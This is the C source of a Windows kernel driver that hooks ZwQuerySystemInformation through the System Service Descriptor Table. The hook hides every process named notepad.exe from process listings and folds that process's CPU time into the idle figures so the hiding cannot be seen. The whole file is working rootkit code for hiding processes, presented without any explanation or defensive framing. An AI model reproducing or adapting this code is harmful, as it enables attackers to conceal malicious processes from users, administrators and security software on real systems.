#include "ntddk.h"

#define SYSTEMSERVICE(func) \
	KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)func + 1)]
#define SYSTEMINDEX(func) \
	*(PULONG)((PUCHAR)func + 1)
#define HOOKFUNC(func, new, old) \
	old = (PVOID)InterlockedExchange( (PULONG) \
	&NewServiceDescriptorTable[SYSTEMINDEX(func)], (ULONG)new)
#define UNHOOKFUNC(func, old) \
	InterlockedExchange( (PULONG) \
	&NewServiceDescriptorTable[SYSTEMINDEX(func)], (ULONG)old)

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase;
	unsigned int NumberOfServices;
	unsigned char *ParamTableBae;
} SSDT_ENTRY;
#pragma pack()
__declspec(dllimport) SSDT_ENTRY KeServiceDescriptorTable;

typedef struct _SYSTEM_PROCESSOR_TIMES
{
    LARGE_INTEGER   IdleTime;
    LARGE_INTEGER   KernelTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   DpcTime;
    LARGE_INTEGER   InterruptTime;
    ULONG           InterruptCount;
} SYSTEM_PROCESSOR_TIMES, *PSYSTEM_PROCESSOR_TIMES;

struct _SYSTEM_THREADS 
{
    LARGE_INTEGER           KernelTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           CreateTime;
    ULONG                   WaitTime;
    PVOID                   StartAddress;
    CLIENT_ID               ClientIs;
    KPRIORITY               Priority;
    KPRIORITY               BasePriority;
    ULONG                   ContextSwitchCount;
    ULONG                   ThreadState;
    KWAIT_REASON            WaitReason;
};

typedef struct _SYSTEM_PROCESSES
{
    ULONG                   NextEntryDelta;
    ULONG                   ThreadCount;
    ULONG                   Reserved[6];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ProcessName;
    KPRIORITY               BasePriority;
    ULONG                   ProcessId;
    ULONG                   InheritedFromProcessId;
    ULONG                   HandleCount;
    ULONG                   Reserved2[2];
    VM_COUNTERS             VmCounters;
    IO_COUNTERS             IoCounters;
    struct _SYSTEM_THREADS  Threads[1];
} SYSTEM_PROCESSES, *PSYSTEM_PROCESSES;

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation( 
    IN ULONG SystemInformationClass,
    IN PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength );
	
typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)( 
    ULONG SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength);
ZWQUERYSYSTEMINFORMATION OldFunc;

NTSTATUS NewFunc( 
    IN ULONG SystemInformationClass , 
    IN PVOID SystemInformation , 
    IN ULONG SystemInformationLength , 
    OUT PULONG ReturnLength );

PMDL MyMDL;
PVOID *NewServiceDescriptorTable;
LARGE_INTEGER UserTime, KernelTime, AllTime;
ZWQUERYSYSTEMINFORMATION OldFunc;

NTSTATUS NewFunc(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	)
{
	NTSTATUS status;
	status = OldFunc(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength );

	if (NT_SUCCESS(status))
	{
		if (SystemInformationClass == 5)
		{
			PSYSTEM_PROCESSES now = (PSYSTEM_PROCESSES)SystemInformation;
			PSYSTEM_PROCESSES prev = NULL;
			while (now)
			{
				if (memcmp(now->ProcessName.Buffer, L"notepad.exe", now->ProcessName.Length) == 0)
				{
					UserTime.QuadPart += now->UserTime.QuadPart;
					KernelTime.QuadPart += now->KernelTime.QuadPart;
					if (prev)
					{
						if (now->NextEntryDelta)
							prev->NextEntryDelta += now->NextEntryDelta;
						else
							prev->NextEntryDelta = 0;
					}
					else
					{
						if (now->NextEntryDelta)
							(char*)SystemInformation += now->NextEntryDelta;
						else
							SystemInformation = NULL;
					}
				}
				else if (now->ProcessName.Buffer == NULL)
				{
					now->UserTime.QuadPart += UserTime.QuadPart;
					now->KernelTime.QuadPart += KernelTime.QuadPart;
				}
				prev = now;
				if (now->NextEntryDelta) (char*)now += now->NextEntryDelta;
				else now = NULL;
			}
		}
		else if (SystemInformationClass == 8)
		{
			PSYSTEM_PROCESSOR_TIMES times = (PSYSTEM_PROCESSOR_TIMES)SystemInformation;
			times->IdleTime.QuadPart += UserTime.QuadPart + KernelTime.QuadPart;
		}
	}
	return status;
}

NTSTATUS MAKEMyMDL()
{
	MyMDL = MmCreateMdl(
		NULL, 
		KeServiceDescriptorTable.ServiceTableBase, 
		KeServiceDescriptorTable.NumberOfServices*4);
	if (!MyMDL) return STATUS_UNSUCCESSFUL;

	MmBuildMdlForNonPagedPool(MyMDL);
	MyMDL->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
	NewServiceDescriptorTable = MmMapLockedPages(MyMDL, KernelMode);
	return STATUS_SUCCESS;
}

VOID HookFunc()
{
	HOOKFUNC(ZwQuerySystemInformation, NewFunc, OldFunc);
}

VOID Unload(PDRIVER_OBJECT driver)
{
	UNHOOKFUNC(ZwQuerySystemInformation, OldFunc);
	if (NewServiceDescriptorTable)
	{
		MmUnmapLockedPages(NewServiceDescriptorTable, MyMDL);
		IoFreeMdl(MyMDL);
	}
	DbgPrint("In Unload");
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT driver, PUNICODE_STRING szReg)
{
	DbgPrint("In DriverEntry");
	if (MAKEMyMDL()!=STATUS_SUCCESS) return STATUS_UNSUCCESSFUL;
	HookFunc();
	driver->DriverUnload = Unload;
	return STATUS_SUCCESS;
}
